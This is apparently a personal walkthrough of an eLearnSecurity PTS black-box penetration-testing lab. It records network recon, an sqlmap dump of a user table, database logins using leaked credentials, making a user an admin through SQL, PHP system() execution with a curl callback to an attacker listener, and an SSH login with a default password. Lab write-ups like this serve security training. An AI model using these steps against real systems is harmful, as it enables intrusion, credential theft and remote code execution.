---
description: Write up for the Black-Box PenTesting 2 by the end of the PTS from IN
---

# Black Box 2

### Target:

```
172.16.64.0/24
```

### Goals

* Discover and exploit all the machines on the network.&#x20;
* Read all flag files (one per machine)
* Obtain a reverse shell at least on 172.16.64.92

### What you will learn:

* Taking advantage of DNS and virtual hosts.
* Bypassing client-side access controls.
* Abusing unrestricted file upload to achieve remote code execution

### Recommended tools

* Dirb.&#x20;
* Metasploit framework (recommended version: 5).
* Nmap.&#x20;
* SQLmap.
* BurpSuite.

## My Solution:

### Network+Info:

#### routing:

```
└─$ route -n           

Kernel IP routing table
Destination     Gateway         Genmask       Use Iface
172.16.64.0     0.0.0.0         255.255.255.0   0 tap0                                                                               
```

#### recon:

```
└─$ fping -a -g 172.16.64.0/24 2>/dev/null 
172.16.64.11
172.16.64.81
172.16.64.91
172.16.64.92
172.16.64.166
```

```bash
└─$ sudo nmap -sS 172.16.64.0/24

Nmap scan report for 172.16.64.81
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:50:56:8E:AD:F6 (VMware)

Nmap scan report for 172.16.64.91
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:50:56:8E:4F:6E (VMware)

Nmap scan report for 172.16.64.92
Not shown: 997 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
MAC Address: 00:50:56:8E:6C:EB (VMware)

Nmap scan report for 172.16.64.166
Not shown: 998 closed ports
PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1
8080/tcp open  http-proxy
MAC Address: 00:50:56:8E:8A:2B (VMware)

Nmap scan report for 172.16.64.11
All 1000 scanned ports on 172.16.64.10 are closed

Nmap done: (5 hosts up) 
```

#### OS FingerPrinting:

```bash
└─$ sudo nmap -Pn -sV -O -A -p- -T4 -v -n -iL fping_out.txt

Warning: 172.16.64.166 giving up on port because retransmission cap hit (2).

Nmap scan report for 172.16.64.81
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
13306/tcp open  mysql   MySQL 5.7.25-0ubuntu0.16.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.25-0ubuntu0.16.04.2
|   Thread ID: 24
|   Capabilities flags: 63487
|   Some Capabilities: LongColumnFlag, Support41Auth, Speaks41ProtocolOld, SupportsLoadDataLocal, ConnectWithDatabase, SupportsTransactions, ODBCClient, SupportsCompression, InteractiveClient, Speaks41ProtocolNew, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, LongPassword, DontAllowDatabaseTableColumn, FoundRows, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: s]Ef=Q(>sW\x01L\x19#\x1DhHpF"
|_  Auth Plugin Name: mysql_native_password
MAC Address: 00:50:56:8E:AD:F6 (VMware)
Aggressive OS guesses: Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 4.8 (95%), Linux 4.9 (95%), Linux 3.16 (95%), Linux 3.12 (95%), Linux 3.18 (95%), Linux 3.8 - 3.11 (95%), Linux 4.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


Nmap scan report for 172.16.64.91
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
6379/tcp open  redis   Redis key-value store
MAC Address: 00:50:56:8E:4F:6E (VMware)
Aggressive OS guesses: Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.12 (95%), Linux 3.18 (95%), Linux 3.8 - 3.11 (95%), Linux 4.4 (95%), Linux 4.8 (95%), Linux 4.9 (95%), ASUS RT-N56U WAP (Linux 3.4) (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop


Nmap scan report for 172.16.64.92
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  dnsmasq 2.75
| dns-nsid: 
|_  bind.version: dnsmasq-2.75
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photon by HTML5 UP
63306/tcp open  mysql   MySQL 5.7.25-0ubuntu0.16.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.25-0ubuntu0.16.04.2
|   Thread ID: 6
|   Capabilities flags: 63487
|   Some Capabilities: LongColumnFlag, Support41Auth, Speaks41ProtocolOld, SupportsLoadDataLocal, ConnectWithDatabase, SupportsTransactions, ODBCClient, SupportsCompression, InteractiveClient, Speaks41ProtocolNew, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, LongPassword, DontAllowDatabaseTableColumn, FoundRows, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: J\x0E9\x14wC\x1DngS}kMJO-C7y1
|_  Auth Plugin Name: mysql_native_password

MAC Address: 00:50:56:8E:6C:EB (VMware)
Aggressive OS guesses: Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), DD-WRT (Linux 3.18) (95%), DD-WRT v3.0 (Linux 4.4.2) (95%), Linux 4.4 (95%), Linux 3.16 (95%), ASUS RT-N56U WAP (Linux 3.4) (94%), Android 4.1.1 (94%), Android 4.1.2 (94%), Android 4.2.2 (Linux 3.4) (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


Nmap scan report for 172.16.64.166
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Ucorpora Demo
MAC Address: 00:50:56:8E:8A:2B (VMware)
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.18 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.4 (95%), Linux 3.16 (95%), ASUS RT-N56U WAP (Linux 3.4) (94%), Linux 3.1 (94%), Linux 3.2 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### First Target (Apache httpd Ubuntu):

#### target:

```bash
172.16.64.81

Not shown: 998 closed ports
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

13306/tcp open  mysql   MySQL 5.7.25-0ubuntu0.16.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.25-0ubuntu0.16.04.2
|   Thread ID: 24
|   Capabilities flags: 63487
|   Some Capabilities: LongColumnFlag, Support41Auth, Speaks41ProtocolOld, SupportsLoadDataLocal, ConnectWithDatabase, SupportsTransactions, ODBCClient, SupportsCompression, InteractiveClient, Speaks41ProtocolNew, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, LongPassword, DontAllowDatabaseTableColumn, FoundRows, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: s]Ef=Q(>sW\x01L\x19#\x1DhHpF"
|_  Auth Plugin Name: mysql_native_password
```

#### dir busting:

```bash
└─$ sudo gobuster dir -u http://172.16.64.81:80 -w /usr/share/seclists/Discovery/Web-Content/common.txt                                                                  1 ⨯
===============================================================
Gobuster v3.1.0
===============================================================
[+] Url:                     http://172.16.64.81:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 291]
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/default              (Status: 301) [Size: 314] [--> http://172.16.64.81/default/]
/index.html           (Status: 200) [Size: 11321]                                 
/server-status        (Status: 403) [Size: 300]                                   
/webapp               (Status: 301) [Size: 313] [--> http://172.16.64.81/webapp/] 
                                                                                
===============================================================
Finished
===============================================================
```

/webapp is interesting let's busted we get the following:

```bash
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 303]
/.hta                 (Status: 403) [Size: 298]
/.htpasswd            (Status: 403) [Size: 303]
/assets               (Status: 301) [Size: 320] [--> http://172.16.64.81/webapp/assets/]
/css                  (Status: 301) [Size: 317] [--> http://172.16.64.81/webapp/css/]   
/emails               (Status: 301) [Size: 320] [--> http://172.16.64.81/webapp/emails/]
/favicon.ico          (Status: 200) [Size: 300757]                                      
/img                  (Status: 301) [Size: 317] [--> http://172.16.64.81/webapp/img/]   
/includes             (Status: 301) [Size: 322] [--> http://172.16.64.81/webapp/includes/]
/index.php            (Status: 200) [Size: 6359]                                          
/install              (Status: 301) [Size: 321] [--> http://172.16.64.81/webapp/install/] 
/lang                 (Status: 301) [Size: 318] [--> http://172.16.64.81/webapp/lang/]    
/robots.txt           (Status: 200) [Size: 206]                                           
/templates            (Status: 301) [Size: 323] [--> http://172.16.64.81/webapp/templates/]
/upload               (Status: 301) [Size: 320] [--> http://172.16.64.81/webapp/upload/]   

```

#### From the Fourth target:

we can add to `/etc/hosts`  the .bak content so we can resolve it and chek the websites:

* static.foocorp.io
* cms.foocorp.io

in  static.foocorp.io using BurpSuite (or dir busting ) we will arrive to `/img/custom/thumbs/users.bak` :

```bash
john1:password123 //the one works with the login page 
peter:youdonotguessthatone5
```

it redirects to /home then /500 not config maybe but /home in burpsuite shows DB info in the header et's use mysql:

![/home.php  response headers](<../../.gitbook/assets/image (38).png>)

```sql
└─$ sudo mysql -u root -p -P 13306 -h 172.16.64.81   
 x41x41x412019!
 
MySQL [cmsbase]>show databases;
MySQL [cmsbase]>use cmsbase
MySQL [cmsbase]>show tables;

MySQL [cmsbase]> select * from flag;
+----+------------------------------+
| id | content                      |
+----+------------------------------+
|  1 | Congratulations, you got it! |
+----+------------------------------+

```

> really helpful: [https://www.mariadbtutorial.com/mariadb-basics/mariadb-select-database/](https://www.mariadbtutorial.com/mariadb-basics/mariadb-select-database/)

we can get all the users:

```bash
MySQL [cmsbase]> select * from tbl_users;
+----+---------+--------------------------------------------------------------+---------+-------------------+-------+---------------------+---------+-------+--------+---------+------------+--------+-------------------+----------------+---------------+
| id | user    | password                                                     | name    | email             | level | timestamp           | address | phone | notify | contact | created_by | active | account_requested | account_denied | max_file_size |
+----+---------+--------------------------------------------------------------+---------+-------------------+-------+---------------------+---------+-------+--------+---------+------------+--------+-------------------+----------------+---------------+
|  1 | foocorp | $2a$08$f2fG8Ncpmj815xQ9U3Ylh.uD0VW/X6kOgjPIEHKP547jspS0FlHF6 | foocorp | admin@foocorp.io  |     9 | 2019-03-13 15:35:14 | NULL    | NULL  |      0 | NULL    | NULL       |      1 |                 0 |              0 |             0 |
|  2 | mickey  | $2a$08$w/oljwDbODAThUR4HTVO8eUjTabE80sH0i6xnOR97ZXfsGGmxohAW | mickey  | mickey@foocorp.io |     7 | 2019-03-13 15:40:46 | NULL    | NULL  |      0 | NULL    | NULL       |      1 |                 0 |              0 |             0 |
|  3 | donald  | $2a$08$dK04y0KEURxDv02vYRab1OMYMSWbW/bpGF.eAWrWv9JAGaa4yTxlq | donald  | donald@foocorp.io |     7 | 2019-03-13 15:42:39 | NULL    | NULL  |      0 | NULL    | NULL       |      1 |                 0 |              0 |             0 |
+----+---------+--------------------------------------------------------------+---------+-------------------+-------+---------------------+---------+-------+--------+---------+------------+--------+-------------------+----------------+---------------+
```



### Second Target (Apache httpd Ubuntu):

#### target:

```bash
172.16.64.91

Not shown: 999 closed ports
PORT   STATE SERVICE VERSION

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

6379/tcp open  redis   Redis key-value st
```

#### dir busting:

```bash
└─$ sudo gobuster dir -u http://172.16.64.91:80 -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.1.0
===============================================================
[+] Url:                     http://172.16.64.91:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/.hta                 (Status: 403) [Size: 291]
/index.html           (Status: 200) [Size: 11321]
/server-status        (Status: 403) [Size: 300]  

===============================================================
Finished
===============================================================
```

from the third target we discovered the new dns entery let's gobust it:

```bash
└─$ sudo gobuster dir -u http://75ajvxi36vchsv584es1.foocorp.io/ -w /usr/share/seclists/Discovery/Web-Content/common.txt

[sudo] password for kali: 
===============================================================
Gobuster v3.1.0
===============================================================
[+] Url:                     http://75ajvxi36vchsv584es1.foocorp.io/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 315]
/.hta                 (Status: 403) [Size: 310]
/.htpasswd            (Status: 403) [Size: 315]
/app                  (Status: 301) [Size: 348] [--> http://75ajvxi36vchsv584es1.foocorp.io/app/]

===============================================================
Finished
===============================================================
```

```bash
www-data@upload:/var/www/html$ cat flag.txt
```

### Third Target (Apache DNS-cache + Photon HTML5  Ubuntu):

#### target:

```bash
172.16.64.92
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

53/tcp open  domain  dnsmasq 2.75
| dns-nsid: 
|_  bind.version: dnsmasq-2.75

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Photon by HTML5 UP

63306/tcp open  mysql   MySQL 5.7.25-0ubuntu0.16.04.2
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.25-0ubuntu0.16.04.2
|   Thread ID: 6
|   Capabilities flags: 63487
|   Status: Autocommit
|   Salt: J\x0E9\x14wC\x1DngS}kMJO-C7y1
|_  Auth Plugin Name: mysql_native_password

```

#### dir busting:

```bash
└─$ sudo gobuster dir -u http://172.16.64.92:80 -w /usr/share/seclists/Discovery/Web-Content/common.txt                                                            
===============================================================
Gobuster v3.1.0
===============================================================
[+] Url:                     http://172.16.64.91:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 291]
/.htpasswd            (Status: 403) [Size: 296]
/.htaccess            (Status: 403) [Size: 296]
/assets               (Status: 301) [Size: 313] [--> http://172.16.64.92/assets/]
/images               (Status: 301) [Size: 313] [--> http://172.16.64.92/images/]
/index.html           (Status: 200) [Size: 1393]                                 
/server-status        (Status: 403) [Size: 300]     

===============================================================
Finished
===============================================================
```

#### dir bust:

```bash
└─$ sudo  gobuster dir -u http://172.16.64.92/72ab311dcbfaa40ca0739f5daf505494 -w /usr/share/seclists/Discovery/Web-Content/common.txt

  ===============================================================
Gobuster v3.1.0
===============================================================
[+] Url:                     http://172.16.64.91:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 324]
/.htaccess            (Status: 403) [Size: 329]
/.htpasswd            (Status: 403) [Size: 329]
/assets               (Status: 301) [Size: 346] [--> http://172.16.64.92/72ab311dcbfaa40ca0739f5daf505494/assets/]
/includes             (Status: 403) [Size: 328]                                                                   
/index.php            (Status: 200) [Size: 0]                                                                     
/login                (Status: 302) [Size: 324] [--> http://172.16.64.92/72ab311dcbfaa40ca0739f5daf505494/login.php]
/tracking             (Status: 302) [Size: 327] [--> http://172.16.64.92/72ab311dcbfaa40ca0739f5daf505494/tracking.php]  

===============================================================
Finished
===============================================================
```

#### SQLi:

```bash
└─$ sqlmap -u http://172.16.64.92/72ab311dcbfaa40ca0739f5daf505494/tracking.php?id='3' -p 'id' --dump      

Database: footracking                                                                                                                                                             
Table: users
[4 entries]
+----+-----+-------------------------------------------+-----------+
| id | adm | password                                  | username  |
+----+-----+-------------------------------------------+-----------+
| 1  | yes | c5d71f305bb017a66c5fa7fd66535b84          | fcadmin1  |
| 2  | yes | 14d69ee186f8d9bbeddd4da31559ce0f          | fcadmin2  |
| 3  | no  | 827ccb0eea8a706c4c34a16891f84e7b (12345)  | tracking1 |
| 4  | no  | e10adc3949ba59abbe56e057f20f883e (123456) | tracking2 |
+----+-----+-------------------------------------------+-----------+

[16:20:18] [INFO] table 'footracking.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/172.16.64.92/dump/footracking/users.csv'
[16:20:18] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/172.16.64.92'

```

login.php interesting we will try the cracked dump pass and will crack more as it but in the source code there's sql conn:

```bash
└─$ sudo mysql -u dbuser -p -P 63306 -h 172.16.64.92

pass: xXxyYyzZz789789)))

MySQL [(none)]> use footracking;
MySQL [footracking]> SELECT * FROM users;

```

#### Update user to admin:

```bash
MySQL [footracking]> update users set adm="yes" where username="tracking1";
```

log out and agian in and type phpinfo(); it shows that we can excute php code.

```bash
└─$ nc -klvp 443  
system('curl http://<IP>:443/qwe')

//get the flag
echo "<pre>";
system("ls -la /var/www");
echo"<\pre>";
system("cat /var/www/flag.txt");
```

as this is a DNS host recommended to visit the /etc/hosts:&#x20;

```bash
system("cat /etc/hosts");
172.16.64.91    75ajvxi36vchsv584es1.foocorp.io //added to /etc/hosts
```



### FourthTarget (Apache httpd Ubuntu):

#### target:

```bash
172.16.64.166
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION

2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Ucorpora Demo
```

#### dir busting:

```bash
└─$ sudo gobuster dir -u http://172.16.64.166:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.1.0
===============================================================
[+] Url:                     http://172.16.64.91:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 299]
/.hta                 (Status: 403) [Size: 294]
/.htpasswd            (Status: 403) [Size: 299]
/css                  (Status: 301) [Size: 319] [--> http://172.16.64.166:8080/css/]
/img                  (Status: 301) [Size: 319] [--> http://172.16.64.166:8080/img/]
/index.htm            (Status: 200) [Size: 13098]                                   
/js                   (Status: 301) [Size: 318] [--> http://172.16.64.166:8080/js/] 
/server-status        (Status: 403) [Size: 303]  

===============================================================
Finished
===============================================================
```

checking the source code of the website shows us interesting names written as a comment using them in ssh as username will grant us access:

```bash
└─$ ssh sabrina@172.16.64.166 -p 2222  
#################################################################
#       WARNING! This system is for authorized users only.      #
#       You activity is being actively monitored.               #
#       Any suspicious behavior will be resported.              #
#################################################################

~~~~ WORK IN PROGRESS ~~~~
Dear employee! Remember to change the default CHANGEME password ASAP.

sabrina@xubuntu:~$ ls
flag.txt  hosts.bak

sabrina@xubuntu:~$ cat flag.txt 
Congratulations! You have successfully exploited this machine.
Go for the others now.

sabrina@xubuntu:~$ cat hosts.bak 
127.0.0.1       localhost
172.16.64.81    cms.foocorp.io
172.16.64.81    static.foocorp.io

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```



### Fifth Target (Unknown):
